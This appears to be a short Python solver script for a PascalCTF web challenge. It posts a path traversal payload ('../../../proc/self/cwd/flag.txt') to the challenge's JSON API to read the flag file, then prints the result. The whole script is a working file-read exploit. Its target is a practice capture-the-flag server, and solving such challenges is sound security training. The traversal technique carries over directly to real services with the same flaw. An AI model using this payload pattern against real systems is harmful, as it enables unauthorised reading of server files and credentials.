#!/usr/bin/env python3
import requests

URL = "https://travel.ctf.pascalctf.it/api/get_json"
payload = {"index": "../../../proc/self/cwd/flag.txt"}

r = requests.post(URL, json=payload)
flag = r.text.strip()

if flag.startswith("pascalCTF"):
    print(f"Flag: {flag}")
else:
    print(f"Response: {flag}")
